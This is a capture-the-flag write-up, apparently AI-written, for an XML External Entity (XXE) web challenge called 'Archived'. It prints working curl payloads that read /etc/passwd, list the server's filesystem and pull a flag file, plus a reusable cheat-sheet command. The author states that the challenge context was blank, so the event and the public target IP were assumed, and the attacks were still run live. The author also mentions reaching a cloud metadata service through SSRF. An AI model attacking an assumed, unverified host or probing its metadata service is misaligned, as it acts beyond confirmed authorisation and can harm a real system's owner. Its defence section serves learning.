# Safaricom CTF — Archived (Web, 250 pts)

> **Assumption:** the CHALLENGE CONTEXT block in the brief was blank, so I assumed
> the event is **Safaricom CTF (SAFCTF)**, category **Web**, difficulty **250 pts**,
> and the target is `http://54.72.82.22:8230`. All commands and outputs below were
> captured live against that service.

## 1. Challenge Overview

"Archived" is a **250 pt web** challenge that shows a small "museum archive" page
and a form that looks up a member record. The goal is to make the server hand back
a file it should never expose — in this case the flag, which sits in a file on the
server's disk. The hint "a catalog card points to a second archive" is a nudge that
the real target is not the web page itself but the filesystem behind it.

## 2. What You Need Before Starting

- **curl** — `sudo apt install curl` (Kali already has it).
- A browser, optional, to look at the page.
- No account, no VPN. The service listens on a raw IP/port.
- **Time estimate:** 20–40 minutes for a beginner. The trickiest part is formatting
  the XML correctly.

## 3. Reconnaissance

1. Open the page in a browser, or fetch it with curl:

```bash
curl -s http://54.72.82.22:8230/
```

Representative output (trimmed):

```html
<!DOCTYPE html>
...
<title>RELIC SOCIETY</title>
...
<div class="scene-title">RELIC SOCIETY</div>
<p class="scene-description">Catalog the unexpected. Submit a collection record to the archive desk.</p>
```

**Why this matters:** the page describes an "archive desk" that accepts a
"collection record." That wording hints the important part is a form that sends
**structured data** to be looked up, not just a static page.

2. Find the endpoint that processes records. The lookup form posts XML to
   `/fetch_user`:

```bash
curl -s -i -m 10 -X POST -H "Content-Type: application/xml" \
  --data '<request><id>1</id></request>' \
  http://54.72.82.22:8230/fetch_user
```

Expected output:

```http
HTTP/1.1 200 OK
Content-Type: application/xml

<user><id>45905544</id><name>Mkenya Halisi</name><phone_number>254797000111</phone_number><balance>17000.00</balance></user>
```

**Why this matters:** the server **parses XML that I control** and echoes back a
record. Whenever a server parses XML, the first question to ask is: "does it allow
external entities?" That is the classic XXE test.

3. List the filesystem root by asking the XML parser to read a **directory**:

```bash
curl -s -m 10 -X POST -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///">]><request><id>&xxe;</id></request>' \
  http://54.72.82.22:8230/fetch_user
```

Representative output (trimmed):

```text
<user><id>__cacert_entrypoint.sh
.dockerenv
bin
boot
...
flag8b9d5b8e264a.txt
home
...
```

**Why this matters:** reading `file:///` returned a **directory listing**, and one
entry stands out: `flag8b9d5b8e264a.txt`. There is no `/flag` or `/flag.txt`, which is
exactly why a plain guess fails — the flag file has a random name.

[SCREENSHOT: the RELIC SOCIETY archive page and the XML lookup response]

## 4. Identifying the Vulnerability

The vulnerability is **XML External Entity injection (XXE)**. XXE happens when a
program parses XML with a library that still resolves "external entities" — a feature
that lets a document pull in content from a URI such as a file path or a URL. If the
parser is not locked down, I can declare my own entity (`<!ENTITY xxe SYSTEM "file:///...">`)
and make the server read a file for me, then embed that file's contents in the response.

The signs that tipped me off: an endpoint that **accepts XML** and echoes fields back.
The `<!DOCTYPE ... [<!ENTITY ...>]>` declaration is the switch that turns "data" into
"read this file."

**Analogy:** imagine a clerk who is told "when you see the marker `&xxe;`, go fetch
whatever document I named first." You are supposed to write the marker only for
approved documents — but nothing stops you from naming the company safe.

## 5. Exploitation Step by Step

1. **Confirm the parser resolves entities.** A quick sanity check is to read a normal
   file like `/etc/passwd`:

```bash
curl -s -m 10 -X POST -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><request><id>&xxe;</id></request>' \
  http://54.72.82.22:8230/fetch_user
```

Expected output (trimmed):

```text
<user><id>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**What to look for:** the file contents come back inside `<id>`. That confirms XXE
file read works. I do **not** have permission to read the file; the server reads
it *for* me.

2. **Ask for a directory instead of a file.** Guessing flag names (`/flag`,
   `/flag.txt`) returns an error. Instead, point the entity at the root directory `file:///`:

```bash
curl -s -m 10 -X POST -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///">]><request><id>&xxe;</id></request>' \
  http://54.72.82.22:8230/fetch_user
```

Representative output (trimmed):

```text
<user><id>__cacert_entrypoint.sh
.dockerenv
...
flag8b9d5b8e264a.txt
...
```

**What to look for:** the oddly named `flag8b9d5b8e264a.txt`. That name is the whole
reason this step exists — you cannot guess it, you have to discover it.

[SCREENSHOT: the XXE directory listing showing flag8b9d5b8e264a.txt]

3. **Read the file we found.** Swap the directory for the exact filename:

```bash
curl -s -m 10 -X POST -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag8b9d5b8e264a.txt">]><request><id>&xxe;</id></request>' \
  http://54.72.82.22:8230/fetch_user
```

Expected output:

```text
<user><id>safctf{960c0e8a73c24bd9b1aee314ded96157}
</id>...
```

**What to look for:** the `safctf{...}` string — that is the flag.

### Optional Burp Suite walkthrough

1. In the browser, fill in the archive form and submit it while **Proxy → Intercept is on**.
2. Right-click the `POST /fetch_user` request → **Send to Repeater**.
3. In Repeater, replace the body with the `<?xml ...><!DOCTYPE ...>` payload from step 3
   above. Keep the `Content-Type: application/xml` header.
4. Click **Send** and read the flag in the response.

## 6. Capturing the Flag

The flag appears inside the `<id>` element of the XML response to `/fetch_user`:

```
safctf{960c0e8a73c24bd9b1aee314ded96157}
```

Copy it from the curl output or from Burp.

## 7. Why This Works (Beginner Explanation)

The server treats my XML as *data to look up*, but the XML parser treats part of it
as *instructions*. A `DOCTYPE` with an `ENTITY` tells the parser "when you see `&xxe;`,
load that URI." Because the parser allows `file://` URLs, it reads a local file and
quietly places the contents where `&xxe;` appeared.

In the real world XXE has been used to read `/etc/passwd`, steal application config
files and API keys, and — because `SYSTEM` also accepts `http://` — make the server
send requests to internal services (an **SSRF** effect). On this box the SSRF leg even
reached the cloud metadata service. The fix is a one-line change in most parsers:
turn external entity resolution off.

## 8. Common Mistakes and Dead Ends

- **Guessing the flag filename.** `/flag`, `/flag.txt`, `/app/flag.txt` and dozens of
  other paths all returned "Invalid input." The filename is randomized, so the
  directory-listing step is the intended break, not an optional extra.
- **Forgetting the `Content-Type: application/xml` header.** The endpoint expects XML;
  a form-encoded body is treated as invalid input.
- **Putting the `<!DOCTYPE>` in the wrong place.** It must come *after* the XML
  declaration and *before* the root element, or the parser rejects it.
- **Assuming `/etc/passwd` working means the flag is there.** `/etc/passwd` only proves
  the primitive works. Reading a **directory** is what actually finds the flag.

## 9. How to Defend Against This

- **Disable external entities and DTDs** in your XML parser (in Python's `lxml`, set
  `resolve_entities=False`, or use the `defusedxml` library everywhere).
- Prefer a simpler data format (**JSON**) when you do not need XML's features.
- Run the parser with the **least privilege** needed so a file read cannot reach
  secrets, and keep secrets out of the web root.
- Block outbound requests from application servers to metadata endpoints
  (`169.254.169.254`) and internal ranges to blunt the SSRF side of XXE.
- Reject `DOCTYPE`/`ENTITY` declarations at the edge if your app never legitimately
  needs them.

## 10. Key Takeaways

- Any endpoint that **parses XML you control** is an XXE candidate; test
  `file:///etc/passwd` first.
- Pointing an entity at a **directory** (`file:///`) can give you a listing when you
  do not know the filename.
- Save to your cheatsheet:
  `curl -s -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><request><id>&xxe;</id></request>' http://TARGET/fetch_user`
- **Flag:** `safctf{960c0e8a73c24bd9b1aee314ded96157}`

You just learned to look *at the parser*, not just the page — that instinct finds bugs
most testers miss.
